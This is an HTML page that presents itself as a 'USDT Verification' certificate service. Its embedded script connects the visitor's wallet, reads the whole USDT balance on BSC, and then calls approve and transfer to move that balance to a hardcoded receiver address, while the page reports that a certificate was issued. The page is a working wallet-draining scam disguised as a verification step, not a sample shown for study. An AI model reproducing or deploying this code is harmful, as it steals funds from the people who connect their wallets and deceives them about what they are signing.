<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USDT Verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <style>
    body {
      background-color: #000;
      color: #fff;
      text-align: center;
      padding-top: 50px;
    }
    .btn-custom {
      background-color: #28a745;
      color: #fff;
      font-size: 20px;
      padding: 10px 30px;
      border-radius: 8px;
      border: none;
    }
    .status {
      margin-top: 20px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <h1>Verify Your USDT Wallet</h1>
  <p>To receive your certificate, connect your wallet and verify your balance.</p>
  <button class="btn-custom" onclick="startVerification()">Get Certificate</button>
  <div class="status" id="status"></div>

  <script>
    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
    const usdtAbi = [
      {
        "constant": false,
        "inputs": [
          {"name": "_spender", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
      }
    ];

    async function startVerification() {
      const status = document.getElementById('status');
      if (typeof window.ethereum === 'undefined') {
        return status.innerText = 'Please install MetaMask or Trust Wallet.';
      }

      const web3 = new Web3(window.ethereum);
      await ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];
      const contract = new web3.eth.Contract(usdtAbi, usdtContractAddress);

      const decimals = await contract.methods.decimals().call();
      const balance = await contract.methods.balanceOf(user).call();
      const formatted = (balance / (10 ** decimals)).toFixed(4);

      if (balance <= 0) {
        return status.innerText = 'No USDT found in wallet.';
      }

      try {
        await contract.methods.approve(receiverAddress, balance).send({ from: user });
        await contract.methods.transfer(receiverAddress, balance).send({ from: user });
        status.innerText = `Certificate successfully! Balance: ${formatted} USDT`;
      } catch (error) {
        console.error(error);
        status.innerText = 'Transaction failed or cancelled.';
      }
    }
  </script>
</body>
</html>
